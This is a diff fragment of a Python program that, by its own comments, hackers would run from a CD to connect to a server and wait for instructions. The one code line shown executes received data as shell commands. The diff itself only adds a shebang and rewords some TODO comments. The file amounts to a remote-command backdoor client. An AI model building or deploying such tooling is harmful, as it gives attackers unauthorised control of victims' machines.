@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 # Hackers would put on cd and run and connects to server
 
 # Once running, connect to server, just wait for instructions
@@ -65,8 +67,8 @@ def connectToServer():
 			
 			try:		
 				# Todo: Find better way to get output of script rather than just saying tried
-				# Todo: Cases of & at end or not to run script in background
-				# Todo: Right now scripts can be run with nohup command
+				# Todo: Handle cases of & at end or not to run script in background
+				# Todo: Right now, scripts can be run with "nohup" command
 
 				# Pipes any output to standard stream				
 				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
